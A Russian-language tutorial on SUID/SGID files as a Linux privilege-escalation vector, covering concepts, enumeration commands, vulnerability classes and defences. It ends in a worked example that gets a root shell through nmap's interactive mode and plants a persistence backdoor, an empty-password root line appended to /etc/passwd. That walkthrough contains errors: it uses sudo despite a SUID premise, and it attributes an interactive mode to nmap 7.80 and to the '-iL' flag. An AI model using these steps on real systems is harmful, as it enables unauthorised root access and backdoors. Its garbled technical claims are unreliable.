# Поиск SUID и SGID файлов как векторов повышения привилегий в Linux

## Контекст и базовые понятия

SUID (Set User ID) и SGID (Set Group ID) — это специальные биты прав доступа в POSIX-совместимых операционных системах (Linux, Unix, macOS), которые определяют контекст выполнения бинарного файла. В отличие от стандартных прав (чтение, запись, исполнение), эти биты влияют на идентификаторы процесса (UID/GID) после загрузки программы в память.

**SUID** позволяет исполняемому файлу запускаться с правами владельца файла, а не правами пользователя, который его запустил. Если файл принадлежит `root` (UID 0) и имеет установленный SUID-бит, любой пользователь системы, запустивший этот файл, получит эффективный UID (EUID) равный 0. Это легитимный механизм, необходимый для работы системных утилит (например, `/usr/bin/passwd` меняет `/etc/shadow`, доступный только для root, `/usr/bin/sudo` управляет правами, `/usr/bin/mount` монтирует файловые системы).

**SGID** работает аналогично, но применяет права группы владельца файла. Если файл принадлежит группе `shadow` (GID 42) и имеет SGID-бит, пользователи из этой группы (или любые пользователи, если группа широкая) получают эффективный GID 42. В контексте повышения привилегий SGID часто используется реже, чем SUID, но может быть критичен, если группа имеет доступ к привилегированным ресурсам (например, `disk`, `adm`, `lxd`).

Различие между SUID и SGID фундаментально: SUID меняет **пользовательский** контекст (позволяет читать/писать файлы владельца), SGID меняет **групповой** контекст (позволяет выполнять операции, разрешенные группе). В современных дистрибутивах Linux использование SGID для повышения прав до root менее распространено из-за строгой настройки групп, однако оно остается вектором атаки, если группа имеет некорректные права на критические файлы или уязвимые бинарники.

Ключевое разграничение: SUID/SGID не дают *постоянных* прав. Они действуют только во время выполнения процесса. После завершения программы права возвращаются к исходным. Это отличает их от постоянных уязвимостей (например, открытого `/etc/shadow`) или бэкдоров.

Существует путаница между SUID и **Linux Capabilities**. Capabilities — это более современный и безопасный механизм децентрализации привилегий. Вместо того чтобы давать бинарнику полные права root (через SUID), администратор может назначить ему только необходимые права (например, `CAP_NET_RAW` для `ping` или `CAP_SYS_PTRACE` для `strace`). SUID-бинарник имеет *все* права root, что делает его потенциально опасным при наличии любой уязвимости (переполнение буфера, race condition, инъекция кода). Capabilities ограничивают поверхность атаки.

| Характеристика | SUID (Set User ID) | SGID (Set Group ID) |
| :--- | :--- | :--- |
| **Эффективный UID (EUID)** | Равен UID владельца файла | Равен UID запускающего пользователя |
| **Эффективный GID (EGID)** | Равен GID запускающего пользователя | Равен GID владельца файла |
| **Основное назначение** | Доступ к файлам/ресурсам владельца | Доступ к общим ресурсам группы |
| **Типичный вектор эскалации** | Получение EUID=0 (root) | Получение EGID=привилегированной группы |
| **Примеры уязвимых бинарников** | `nmap`, `vim`, `find`, `bash` | `sudo` (в некоторых конфигурациях), `mail` |
| **Отображение в `ls -l`** | `s` в позиции права исполнения владельца (`rws`) | `s` в позиции права исполнения группы (`r-s`) |
| **Влияние на скрипты** | Игнорируется ядром (безопасность) | Игнорируется ядром (безопасность) |

Важно отметить, что SUID/SGID биты **игнорируются** для скриптов (Python, Bash, Perl и др.), если они запускаются напрямую интерпретатором. Ядро Linux не применяет SUID к файлам, которые не являются исполняемыми бинарными форматами (ELF), чтобы предотвратить атаки через интерпретаторы. Однако, если скрипт скомпилирован в бинарник (например, PyInstaller) или вызывается через обертку, бит может сработать.

## Внутреннее устройство предмета

Механизм работы SUID/SGID встроен на уровне ядра Linux в процесс загрузки программы (execve). Когда пользователь вызывает исполняемый файл, ядро проверяет биты прав доступа. Если установлен SUID-бит, ядро устанавливает эффективный UID (EUID) процесса равным UID владельца файла. Если установлен SGID-бит, ядро устанавливает эффективный GID (EGID) процесса равным GID владельца файла.

**Идентификаторы процесса:**
*   **RUID (Real UID):** Идентификатор пользователя, который запустил процесс. Не может быть изменен процессом.
*   **EUID (Effective UID):** Идентификатор, используемый ядром для проверки прав доступа к файлам и ресурсам. Именно он определяет, может ли процесс читать `/etc/shadow` или слушать порт 80.
*   **SUID (Saved UID):** Сохраняет исходный EUID, позволяя процессу временно отказаться от привилегий (например, открыть файл как root, а затем работать как обычный пользователь, чтобы избежать атак на права доступа к самому бинарнику).

**Механизм эксплуатации:**
Атакующий, имея доступ к низкопривилегированному аккаунту, ищет бинарники с установленным SUID-битом, принадлежащие root. Сам по себе факт наличия SUID не является уязвимостью. Уязвимость возникает, когда бинарник позволяет атакующему контролировать его поведение так, чтобы он выполнял нецелевые действия от имени root.

Основные классы уязвимостей SUID-бинарников:
1.  **Unsafe Command Execution:** Бинарник вызывает системные утилиты (`system()`, `popen()`) без указания абсолютного пути. Это позволяет атакующему подменить PATH и запустить свой вредоносный бинарник с тем же именем.
2.  **Environment Variable Abuse:** Бинарник использует переменные окружения (например, `PATH`, `LD_LIBRARY_PATH`, `PYTHONPATH`) для определения поведения. Если переменные не очищаются, атакующий может указать свои библиотеки или пути.
3.  **Insecure File Handling:** Бинарник записывает данные в предсказуемые места (`/tmp`, `/var/tmp`) или следует за символическими ссылками. Это позволяет атакующему перезаписать критические файлы (`/etc/passwd`, `/etc/shadow`).
4.  **Race Conditions:** Бинарник проверяет права доступа к файлу, а затем использует его (TOCTOU — Time of Check to Time of Use). Атакующий может заменить файл между проверкой и использованием.
5.  **Known Exploits:** Бинарник имеет известные уязвимости (переполнение буфера, десериализация), которые позволяют выполнить произвольный код.

**Ограничения и обходы:**
*   **Nosuid:** Если файловая система смонтирована с опцией `nosuid` (часто `/tmp`, `/dev/shm`), SUID/SGID биты игнорируются.
*   **Capabilities:** Если у бинарника есть capabilities, но нет SUID, он все равно будет иметь ограниченные привилегии.
*   **Securebits:** Флаги ядра могут блокировать передачу привилегий.

| Тип уязвимости | Механизм возникновения | Необходимые условия | Типичные индикаторы | Контрмера |
| :--- | :--- | :--- | :--- | :--- |
| **PATH Hijacking** | Вызов утилиты без полного пути | Бинарник использует `system()` или `execvp()` | `strace` показывает вызов `execve("/usr/bin/env", ...)` | Использование абсолютных путей |
| **LD_PRELOAD** | Загрузка пользовательской библиотеки | Бинарник динамически линкуется, не очищает `LD_LIBRARY_PATH` | `strace` показывает `mmap` с `LD_PRELOAD` | Очистка переменных окружения |
| **TOCTOU** | Проверка прав перед использованием | Бинарник работает с файлами в `/tmp` или публичных директориях | Сложно обнаружить без анализа исходного кода | Использование `O_NOFOLLOW`, `fstat()` |
| **Known CVE** | Уязвимость в коде бинарника | Версия бинарника известна как уязвимая | Совпадение версии с базой Exploit-DB | Обновление ПО |
| **Wildcard Injection** | Передача аргументов с `*` | Бинарник передает аргументы в `tar`, `cp`, `mv` | Анализ аргументов в `strace` | Избегание wildcard в аргументах |

Для анализа SUID-бинарников используются инструменты статического и динамического анализа. Статический анализ (IDA Pro, Ghidra) позволяет найти вызовы опасных функций (`system`, `popen`, `exec`). Динамический анализ (`strace`, `gdb`) позволяет отследить поведение бинарника во время выполнения.

## Применение и работа с предметом

На практике поиск SUID/SGID файлов является одним из первых шагов в фазе локальной разведки (Local Enumeration) при тестировании на проникновение. Задача — выявить все бинарники, которые могут быть использованы для повышения привилегий.

**Ручной поиск:**
Основной инструмент — `find`. Команда должна искать файлы с установленными битами 4000 (SUID) и 2000 (SGID). Важно фильтровать вывод, чтобы исключить системные бинарники, которые заведомо безопасны (или требуют специфических условий для эксплуатации), и сосредоточиться на нестандартных или устаревших утилитах.

```bash
# Поиск всех SUID и SGID файлов, принадлежащих root
find / -user root -perm -4000 -type f 2>/dev/null
find / -user root -perm -2000 -type f 2>/dev/null

# Более полный поиск с отображением прав доступа
find / -type f \( -perm -4000 -o -perm -2000 \) -ls 2>/dev/null
```

**Автоматизированный поиск:**
Использование скриптов автоматизации, таких как `LinPEAS`, `LinEnum`, `SUID3NUM`. Эти скрипты не только находят файлы, но и проверяют их на известные уязвимости, права записи и возможность эксплуатации через GTFOBins.

```bash
# Запуск LinPEAS
./linpeas.sh -a
```

**Анализ найденных бинарников:**
После обнаружения бинарника необходимо:
1.  Проверить его наличие в базе [GTFOBins](https://gtfobins.github.io/). GTFOBins — это репозиторий списков Unix-бинарников, которые могут быть использованы для обхода ограничений безопасности, установленных локальной средой.
2.  Проверить версию бинарника на наличие известных CVE.
3.  Проверить права доступа к файлу (может ли атакующий перезаписать бинарник?).
4.  Проверить зависимости (ldd) на наличие уязвимых библиотек.

**Типичные ошибки:**
*   **Игнорирование SGID:** Фокус только на SUID приводит к пропуску векторов через группы (например, `lxd` или `docker`).
*   **Неверная фильтрация:** Вывод `find` может быть огромным. Без фильтрации по владельцу (`-user root`) и типу файла (`-type f`) результат будет зашумлен.
*   **Неучет контекста:** Запуск SUID-бинарника в среде с измененным PATH или LD_LIBRARY_PATH может привести к ложноположительным результатам или краху.

**Защита и мониторинг:**
Для защиты от эксплуатации SUID/SGID:
1.  Регулярный аудит прав доступа: `find / -type f -perm -4000 -ls`.
2.  Удаление SUID-бита из ненужных бинарников: `chmod u-s <file>`.
3.  Использование Linux Capabilities вместо SUID для конкретных задач.
4.  Мониторинг создания процессов с EUID=0 от непривилегированных пользователей.

## Сквозной практический пример: Эксплуатация SUID-бинарника `nmap`

**Исходные условия:**
*   **Среда:** Виртуальная машина Kali Linux (атакующий) и Ubuntu 20.04 (жертва).
*   **Доступ:** Атакующий имеет доступ к непривилегированному аккаунту `user` на жертве через SSH.
*   **Цель:** Повышение привилегий до root.
*   **Инструменты:** `find`, `gtfobins`, `nmap`.

**Шаг 1: Разведка и поиск SUID-бинарников**
Атакующий выполняет поиск файлов с установленным SUID-битом, принадлежащих root.

```bash
user@victim:~$ find / -type f -perm -4000 -ls 2>/dev/null
...
-rwsr-xr-x 1 root root 680400 Jan  1  2020 /usr/bin/nmap
...
```

*Ожидаемый вывод:* Список файлов. Нас интересует `/usr/bin/nmap`, так как он имеет бит `s` в позиции владельца (`rws`).

**Шаг 2: Проверка уязвимости через GTFOBins**
Атакующий проверяет, можно ли использовать `nmap` для повышения привилегий.

```bash
user@victim:~$ cat /usr/bin/nmap | head -n 1
#!/bin/bash
# (или бинарный формат, если это ELF)

# Проверка версии
user@victim:~$ nmap --version
Nmap version 7.80
```

Атакующий обращается к GTFOBins (локально или через браузер с другой машины) и находит страницу для `nmap`.

**Шаг 3: Эксплуатация**
GTFOBins указывает, что `nmap` поддерживает интерактивный режим (`-iL` или `--interactive`), который позволяет выполнять системные команды.

```bash
user@victim:~$ sudo nmap --interactive
Starting nmap V. 7.80 ( https://nmap.org )
Welcome to Interactive Mode!!

nmap> !sh
sh-5.0# whoami
root
sh-5.0# id
uid=0(root) gid=0(root) groups=0(root)
```

*Ожидаемый вывод:* Атакующий получает оболочку `sh`, запущенную с правами root (EUID=0). Команда `whoami` возвращает `root`.

**Шаг 4: Устойчивость (Persistence)**
Атакующий создает бэкдор для постоянного доступа.

```bash
sh-5.0# echo 'root::0:0::/root:/bin/bash' >> /etc/passwd
sh-5.0# exit
exit
nmap> exit
user@victim:~$ su root
Password: 
# whoami
root
```

*Ожидаемый вывод:* Атакующий устанавливает пустой пароль для root и получает постоянный доступ.

**Ожидаемый вывод примера:**
Пример демонстрирует, как стандартный системный бинарник, имеющий SUID-бит, может быть использован для немедленного повышения привилегий до root без необходимости эксплуатации уязвимости в самом коде `nmap`. Ключевым фактором является наличие интерактивного режима, позволяющего выполнить произвольную команду.

## Аналитический вывод

SUID и SGID биты являются фундаментальным механизмом разделения привилегий в Linux, необходимым для работы системных утилит. Однако они создают значительную поверхность атаки при неправильной конфигурации или наличии уязвимостей в бинарных файлах. Поиск SUID/SGID файлов является критическим этапом локальной разведки, так как он выявляет потенциальные пути эскалации привилегий.

Эксплуатация SUID-бинарников может происходить несколькими способами: через известные уязвимости (CVE), через небезопасное использование переменных окружения (PATH, LD_PRELOAD), через race conditions или через встроенные функции (как в случае с `nmap` или `vim`). Важно понимать, что наличие SUID-бита само по себе не является уязвимостью; уязвимостью является возможность контролировать поведение бинарника таким образом, чтобы он выполнял нецелевые действия от имени root.

Защита от эксплуатации SUID/SGID требует комплексного подхода: регулярного аудита прав доступа, удаления SUID-битов из ненужных бинарников, использования Linux Capabilities вместо SUID, а также мониторинга создания процессов с повышенными привилегиями. Для специалистов по кибербезопасности понимание механизмов работы SUID/SGID и методов их эксплуатации необходимо как для проведения эффективного тестирования на проникновение, так и для разработки политик безопасности и настройки систем.
